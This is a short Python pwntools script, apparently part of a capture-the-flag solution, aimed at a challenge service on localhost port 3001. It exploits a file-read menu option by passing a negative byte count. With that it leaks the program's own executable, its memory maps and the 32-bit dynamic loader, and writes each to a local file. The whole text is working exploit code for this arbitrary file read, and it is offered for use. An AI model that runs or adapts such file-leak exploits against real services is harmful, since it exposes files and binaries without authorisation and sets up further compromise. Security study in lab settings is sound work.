#!/usr/bin/python3

from pwn import *

# Leak binary
#p = process('./allmant_underligt_extraordinart_verktyg')
p = remote('127.0.0.1', 3001)
p.sendlineafter('Choice: ', '1')
p.sendlineafter('Filename: ', '/proc/self/exe')
p.sendlineafter('nr of bytes: ', '-1')
raw = p.recvall(timeout=1)[:-20]
with open("chall_exfil.elf", "wb") as fh:
    fh.write(raw)
p.close()
# ...Reverse...

# Leak maps to get ld filename
#p = process('./allmant_underligt_extraordinart_verktyg')
p = remote('127.0.0.1', 3001)
p.sendlineafter('Choice: ', '1')
p.sendlineafter('Filename: ', '/proc/self/maps')
p.sendlineafter('nr of bytes: ', '-1')
raw = p.recvuntil("EOF",timeout=1)[:-3]
with open("maps_exfil.txt", "wb") as fh:
    fh.write(raw)
p.close()

# Leak ld
#p = process('./allmant_underligt_extraordinart_verktyg')
p = remote('127.0.0.1', 3001)
p.sendlineafter('Choice: ', '1')
p.sendlineafter('Filename: ', '/usr/lib32/ld-linux.so.2')
p.sendlineafter('nr of bytes: ', '-1')
raw = p.recvall(timeout=1)[:-30]
with open("ld_exfil.elf", "wb") as fh:
    fh.write(raw)
p.close()
